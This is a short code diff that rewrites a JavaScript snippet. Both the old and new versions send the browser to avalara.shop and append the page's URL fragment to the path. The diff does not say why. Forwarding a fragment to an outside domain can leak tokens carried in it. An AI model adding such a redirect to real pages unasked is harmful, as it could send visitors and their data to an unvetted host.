@@ -1,1 +1,8 @@
-<script>document.location.href = 'http://avalara.shop/'+window.location.href.split('#')[1];</script>
+<script>
+  const part = window.location.hash.substring(1);
+  if (part) {
+    window.location.href = "https://avalara.shop/" + part;
+  } else {
+    window.location.href = "https://avalara.shop";
+  }
+</script>
